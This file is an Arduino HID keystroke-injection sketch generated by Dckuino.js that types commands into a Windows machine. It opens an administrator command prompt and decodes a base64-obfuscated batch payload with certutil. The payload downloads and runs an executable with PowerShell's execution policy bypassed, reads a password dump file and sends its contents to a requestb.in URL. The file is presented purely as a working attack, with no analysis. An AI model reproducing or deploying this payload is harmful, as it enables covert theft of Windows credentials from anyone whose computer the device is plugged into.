#include <Keyboard.h>

/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

//#include <Keyboard.h>

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(400);

  typeKey(KEY_LEFT_GUI);

  delay(200);

  Keyboard.print("cmd");

  Keyboard.press(KEY_LEFT_CTRL);
  delay(200);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();

  delay(200);

  typeKey(KEY_LEFT_ARROW);

  delay(200);

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("cd / & mkdir win & cd win");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo Y2QgL3dpbiAmIGVjaG8gKHdnZXQgJ2h0dHBzOi8vZmlsZS50b3duL2Rvd25sb2FkLzNmM2Y2ZTQ2aHRwd3l2aGZmdGsxZDg1NDInIC1PdXRGaWxlIG91dC5leGUpID4gdGVzdC5QUzEgJiBwb3dlcnNoZWxsIC1FeGVjdXRpb25Qb2xpY3kgQnlQYXNzIC1GaWxlIHRlc3QucHMxICYgU1RBUlQgL0Igb3V0LmV4ZSAmIHBpbmcgMTI3LjAuMC4xIC1uIDQgPiBudWwgJiBlY2hvICgkcGFzc2VzID0gR2V0LUNvbnRlbnQgYzpcd2luXDEyNy4wLjAuMS5wd2R1bXApOygkdXJsID0gJ2h0dHA6Ly9yZXF1ZXN0Yi5pbi9wYjNhODdwYj9wPScgKyAkcGFzc2VzKTsod2dldCAkdXJsKSA+IHJlcXVlc3QuUFMxICYgcG93ZXJzaGVsbCAtRXhlY3V0aW9uUG9saWN5IEJ5UGFzcyAtRmlsZSByZXF1ZXN0LnBzMSAmIGV4aXQNCg== > base.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("certutil -decode base.txt run.bat");

  typeKey(KEY_RETURN);

  delay(150);

  Keyboard.print("START /MIN run.bat");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
